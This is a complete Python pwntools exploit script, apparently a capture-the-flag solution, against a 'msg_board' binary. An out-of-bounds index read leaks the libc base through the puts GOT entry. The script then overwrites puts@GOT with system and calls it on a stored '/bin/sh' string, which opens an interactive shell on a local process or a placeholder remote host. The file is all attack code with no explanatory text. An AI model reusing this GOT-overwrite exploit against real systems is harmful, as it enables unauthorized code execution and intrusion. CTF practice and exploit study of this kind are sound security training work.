from pwn import *

exe = ELF("msg_board")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

context.binary = exe

def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.R2:
            util.proc.wait_for_debugger(util.proc.pidof(r)[0])
    else:
        r = remote("rua_host_goes_here", 1337)
    return r

puts_got_offset = str((exe.got["puts"] - exe.symbols["msgs"]) // 0x20).encode()

io = start()

# leak libc address
io.sendlineafter(b"choice: ",b"1")
io.sendlineafter(b"index (0-15): ",puts_got_offset)
libc.address = int.from_bytes(io.recvuntil(b"\n",drop=True),"little") - libc.sym["puts"]
log.info("libc base: %s" % hex(libc.address))
io.sendlineafter(b"choice: ",b"2")
io.sendlineafter(b"index (0-15): ",b"0")
io.sendlineafter(b"leave your message here: ",b"/bin/sh\x00");
io.sendlineafter(b"choice: ",b"2")
io.sendlineafter(b"index (0-15): ",puts_got_offset)
io.sendlineafter(b"leave your message here: ",libc.sym["system"].to_bytes(8,"little"));
io.sendlineafter(b"choice: ",b"1")
io.sendlineafter(b"index (0-15): ",b"0")
io.interactive()